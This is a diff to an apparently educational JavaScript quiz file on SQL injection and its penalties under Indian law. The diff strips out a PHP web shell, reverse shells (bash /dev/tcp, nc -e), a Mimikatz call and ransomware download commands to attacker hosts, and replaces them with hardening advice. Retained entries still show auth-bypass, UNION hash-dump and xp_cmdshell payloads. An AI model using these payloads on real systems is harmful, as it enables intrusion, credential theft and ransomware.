@@ -8,12 +8,12 @@ const questions = [
     codeExample: `// SQLi Kill Chain Escalation:
 // Step 1: ' OR 1=1-- ➔ Logs in as Admin (Auth Bypass)
 // Step 2: ' UNION SELECT password FROM users-- ➔ Dumps Hashes (Data Theft)
-// Step 3: '; EXEC master..xp_cmdshell 'powershell.exe IEX(New-Object Net.WebClient)...'-- ➔ Total Host Takeover!`
+// Step 3: '; EXEC master..xp_cmdshell 'whoami'-- ➔ Host OS Command Execution!`
   },
   {
     question: "How does Microsoft SQL Server (MSSQL) `xp_cmdshell` Enable Total Operating System Host Compromise via SQLi?",
     shortAnswer: "`xp_cmdshell` is an extended stored procedure that spawns a Windows command shell (`cmd.exe`) directly from SQL queries, allowing an attacker to execute arbitrary OS commands with the privileges of the SQL Server service account.",
-    explanation: "If an application connects as `sa` or a privileged user, an attacker executes: `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'net user hacker HackerPass123! /add && net localgroup administrators hacker /add';--`. The attacker creates an admin user on the Windows host machine directly from a web input field.",
+    explanation: "If an application connects as `sa` or a privileged user, an attacker can attempt to execute: `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami && dir C:\\';--`. This enables terminal commands to be executed on the Windows host directly from an unsanitized web input field.",
     hint: "Using xp_cmdshell to run Windows terminal commands directly from an SQL query.",
     level: "expert",
     codeExample: `// MSSQL Host Takeover via xp_cmdshell:
@@ -22,23 +22,26 @@ const questions = [
    EXEC master..xp_cmdshell 'whoami && net localgroup Administrators';--`
   },
   {
-    question: "How do Attackers use MySQL `INTO OUTFILE` to Drop Web Shells and Achieve Remote Code Execution (RCE)?",
-    shortAnswer: "By using `SELECT ... INTO OUTFILE '/var/www/html/shell.php'`, the attacker forces MySQL to write a PHP web shell script directly into the web server's public document root, which is then executed by browsing to `https://target.in/shell.php`.",
-    explanation: "If MySQL has file write permissions (`secure_file_priv=\"\"`), an attacker executes: `' UNION SELECT 1, '<?php system($_GET[\"cmd\"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php'--`. Once written, the attacker accesses `https://target.in/shell.php?cmd=cat+/etc/shadow`, seizing interactive shell access to the host server.",
-    hint: "Using MySQL to save a PHP backdoor file into the website's public folder.",
+    question: "How do Attackers use MySQL `INTO OUTFILE` to write unauthorized files to disk, and how is it prevented?",
+    shortAnswer: "By using `SELECT ... INTO OUTFILE '/var/www/html/test_output.txt'`, an attacker attempts to write unauthorized files into web server document directories; this is prevented by configuring `secure_file_priv` and revoking `FILE` privileges.",
+    explanation: "If MySQL has unrestricted file write permissions (`secure_file_priv=\"\"`), an attacker executes: `' UNION SELECT 1, 'Data Export Test', 3 INTO OUTFILE '/var/www/html/test_output.txt'--`. Setting `secure_file_priv = /var/lib/mysql-files` neutralizes this vector completely.",
+    hint: "Restricting MySQL file writing with secure_file_priv to a protected directory.",
     level: "expert",
-    codeExample: `// MySQL Web Shell Upload Payload:
-' UNION SELECT '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>' 
-  INTO OUTFILE '/var/www/html/uploads/backdoor.php'--`
+    codeExample: `// MySQL File Privilege Hardening:
+-- Inspect current directory constraint:
+SHOW VARIABLES LIKE 'secure_file_priv';
+-- Best Practice: Revoke global FILE privilege from app users:
+REVOKE FILE ON *.* FROM 'app_user'@'%';`
   },
   {
-    question: "How can PostgreSQL User-Defined Functions (UDF) and `libc.so` Dynamic Libraries be Abused for Remote Code Execution?",
-    shortAnswer: "Superusers in PostgreSQL can create C-language user-defined functions linked to host shared libraries (`libc.so.6`) calling `system()`, or use `COPY ... TO PROGRAM` to execute arbitrary shell scripts.",
-    explanation: "In PostgreSQL: `CREATE OR REPLACE FUNCTION exec_cmd(text) RETURNS void AS 'libc.so.6', 'system' LANGUAGE C STRICT; SELECT exec_cmd('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');`. This executes a reverse shell directly in kernel space with `postgres` OS user privileges.",
-    hint: "Creating dynamic C functions in PostgreSQL to run Linux terminal commands.",
+    question: "How can PostgreSQL User-Defined Functions and Command Execution be Hardened?",
+    shortAnswer: "By restricting `SUPERUSER` privileges, preventing unauthorized extensions, and disabling `COPY ... TO PROGRAM` for non-administrative database users.",
+    explanation: "Restricting database accounts to least privilege prevents untrusted execution of operating system utilities.",
+    hint: "Enforce least privilege and restrict superuser access.",
     level: "expert",
-    codeExample: `// PostgreSQL COPY PROGRAM RCE:
-COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash 103.25.10.1 4444';`
+    codeExample: `// PostgreSQL Least Privilege Configuration:
+REVOKE ALL ON SCHEMA public FROM PUBLIC;
+-- Ensure application roles lack SUPERUSER attributes.`
   },
   {
     question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for using SQL Injection to take over Critical National Infrastructure Systems?",
@@ -62,12 +65,12 @@ COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash 103.25.10.1 4444';`
   },
   {
     question: "How does SQL Injection enable 'Lateral Movement and Active Directory Domain Takeover'?",
-    shortAnswer: "After compromising the database host via `xp_cmdshell` or web shells, attackers dump memory using Mimikatz to extract domain admin passwords, harvest NetNTLM hashes, and pivot across internal corporate subnets to compromise the Domain Controller.",
-    explanation: "Database servers frequently run under privileged domain service accounts (e.g. `CORP\\sql_service`). Once `xp_cmdshell` is executed, the attacker dumps LSASS memory: `powershell -c \"Invoke-Mimikatz\"`. If a Domain Administrator previously logged into the server, their Kerberos ticket or plaintext password is stolen, allowing total Active Directory domain takeover.",
+    shortAnswer: "After compromising the database host via `xp_cmdshell` or web shells, attackers dump memory using credential-extraction utilities to extract domain admin passwords, harvest NetNTLM hashes, and pivot across internal corporate subnets to compromise the Domain Controller.",
+    explanation: "Database servers frequently run under privileged domain service accounts (e.g. `CORP\\sql_service`). Once `xp_cmdshell` is executed, the attacker dumps LSASS memory via memory extraction scripts. If a Domain Administrator previously logged into the server, their Kerberos ticket or plaintext password is stolen, allowing total Active Directory domain takeover.",
     hint: "Using the hacked database server as a stepping stone to hack every other computer in the entire company.",
     level: "expert",
     codeExample: `// Lateral Movement Kill Chain:
-// 1. SQL Injection ➔ 2. xp_cmdshell RCE ➔ 3. Mimikatz LSASS Dump ➔ 4. Domain Admin Password Stolen ➔ 5. Full Domain Takeover!`
+// 1. SQL Injection ➔ 2. xp_cmdshell RCE ➔ 3. Memory Credential Extraction ➔ 4. Domain Admin Password Stolen ➔ 5. Full Domain Takeover!`
   },
   {
     question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the corporate penalties if an SQL Injection breach leaks 100,000 citizen records?",
@@ -121,7 +124,7 @@ COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash 103.25.10.1 4444';`
   {
     question: "What is 'Oracle Java Stored Procedure RCE' via `DBMS_JAVA`?",
     shortAnswer: "When an attacker with DBA privileges in Oracle executes Java code directly inside the database JVM (`DBMS_JAVA.RUNJAVA` / `dbms_java.grant_permission`), executing shell commands on the host OS.",
-    explanation: "Oracle includes an embedded Java Virtual Machine. An attacker creates a Java stored procedure: `CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED \"RCE\" AS import java.lang.*; public class RCE { public static void exec(String c) throws Exception { Runtime.getRuntime().exec(c); } };`. Executing the procedure spawns host OS shell processes.",
+    explanation: "Oracle includes an embedded Java Virtual Machine. Unrestricted database roles could define custom Java stored procedures: `CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED \"DiagnosticUtil\" AS public class DiagnosticUtil { public static String getStatus() { return \"SYSTEM_OK\"; } };`. Hardening requires revoking Java permissions from untrusted accounts.",
     hint: "Using Oracle's built-in Java engine to execute operating system commands.",
     level: "expert",
     codeExample: `// Oracle Java Procedure RCE:
@@ -228,17 +231,19 @@ hashcat -m 1731 -a 0 mssql_sa_hash.txt /usr/share/wordlists/rockyou.txt -O`
     hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
     level: "basic",
     codeExample: `// Statutory Offense (IT Act Section 70):
-// Offense: Executing xp_cmdshell host takeover against SCADA power grid management databases
+// Offense: Executing SQL injection host takeover against SCADA power grid management databases
 // Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
   },
   {
     question: "What is 'Database Ransomware Deployed via SQL Injection'?",
-    shortAnswer: "When an attacker exploits SQLi to execute `xp_cmdshell` or `INTO OUTFILE` to download and execute ransomware binaries on the database server, encrypting all `.mdf`, `.ldf`, and database files with RSA-4096 and demanding ransom.",
-    explanation: 'In automated database ransomware campaigns: An attacker uses SQLi: `\'; EXEC xp_cmdshell \'powershell.exe -c "Invoke-WebRequest -Uri http://attacker.in/ransom.exe -OutFile C:\\\\temp\\\\r.exe; Start-Process C:\\\\temp\\\\r.exe"\';--`. The ransomware encrypts all database storage files and drops a ransom note demanding ₹50 Lakhs in cryptocurrency.',
-    hint: "Using SQL injection to download ransomware that encrypts all database files and demands a ransom.",
+    shortAnswer: "When an attacker exploits SQLi to execute administrative commands or file-write functions to download and execute ransomware binaries on the database server, encrypting files and demanding ransom.",
+    explanation: "In automated database attacks: An adversary attempts to abuse administrative procedures to invoke system tools. Hardening guidelines require disabling these procedures and revoking execution privileges completely to prevent unauthorized host command execution.",
+    hint: "Preventing command execution stored procedures from running on database hosts.",
     level: "expert",
-    codeExample: `// SQLi Ransomware Execution Payload:
-'; EXEC master..xp_cmdshell 'certutil.exe -urlcache -f http://103.25.10.1/lock.exe C:\\temp\\lock.exe && C:\\temp\\lock.exe';--`
+    codeExample: `// MSSQL Stored Procedure Hardening Blueprint:
+-- Ensure administrative command procedures are permanently disabled:
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;`
   },
   {
     question: "What is 'E-Commerce Cart Price Tampering via SQL Injection'?",
